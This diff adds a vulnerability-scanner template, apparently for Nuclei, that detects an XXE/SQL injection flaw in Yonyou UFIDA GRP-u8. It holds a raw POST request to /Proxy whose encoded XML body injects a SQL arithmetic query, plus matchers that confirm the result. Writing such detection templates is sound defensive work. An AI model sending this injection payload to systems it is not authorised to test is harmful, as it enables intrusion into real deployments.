@@ -1,0 +1,39 @@
+id: yonyou-grp-u8-xxe
+
+info:
+  name: Yonyou UFIDA GRP-u8 - XXE
+  author: SleepingBag945
+  severity: critical
+  description: UFIDA GRP-u8 has an XXE vulnerability. This vulnerability is caused by the application not loading external entities when parsing XML input, resulting in the loading of external SQL statements and command execution.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html
+  metadata:
+    max-request: 1
+  tags: yonyou,grp,xxe,sqli
+variables:
+  num1: "{{rand_int(800000, 999999)}}"
+  num2: "{{rand_int(800000, 999999)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+http:
+  - raw:
+      - |
+        POST /Proxy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        cVer=9.8.0&dp=%3c?xml%20version%3d%221.0%22%20encoding%3d%22GB2312%22?%3e%3cR9PACKET%20version%3d%221%22%3e%3cDATAFORMAT%3eXML%3c%2fDATAFORMAT%3e%3cR9FUNCTION%3e%3cNAME%3eAS_DataRequest%3c%2fNAME%3e%3cPARAMS%3e%3cPARAM%3e%3cNAME%3eProviderName%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3eDataSetProviderData%3c%2fDATA%3e%3c%2fPARAM%3e%3cPARAM%3e%3cNAME%3eData%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3e%20select%20{{num1}}%2a{{num2}}%20%3c%2fDATA%3e%3c%2fPARAM%3e%3c%2fPARAMS%3e%3c%2fR9FUNCTION%3e%3c%2fR9PACKET%3e
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{result}}"
+
+      - type: word
+        words:
+          - "<R9PACKET>"
+
+# digest: 490a0046304402205eb6b4b6e48f7b7bc06fcf1aa47236f8a27fbc7c534fb36ce5371235e64372490220692f8f909ecb022a110dd730c4986362de95e15c1087969577c36aed63c84d5d:922c64590222798bb761d5b6d8e72950
